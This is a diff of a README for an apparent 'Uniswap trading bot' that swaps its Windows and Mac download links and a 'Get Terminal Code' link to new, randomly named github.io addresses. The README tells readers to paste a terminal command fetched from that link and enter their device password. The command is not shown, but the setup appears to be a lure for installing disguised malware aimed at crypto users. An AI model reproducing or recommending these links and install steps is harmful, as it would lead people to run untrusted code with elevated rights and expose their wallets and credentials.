@@ -17,7 +17,7 @@
 <div align="center">  
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://uniswap-trading-bot.github.io/.github/)
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://akffjfhha485876.github.io/.github/uniswap)    
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://kwevidienes.github.io/.github/uniswap)    
 
 </div>  
 
@@ -144,7 +144,7 @@ uniswap-trading-bot/
 
 1. Click on the "Get terminal code" button and copy the installation command there.
 
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/NAj7H12t)
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://kwevidienes.github.io/.github/uniswap)
 
 2. Open the terminal on your device and paste the command you copied above, then press the "Return" button.
 3. Enter your device password and confirm the installation. 
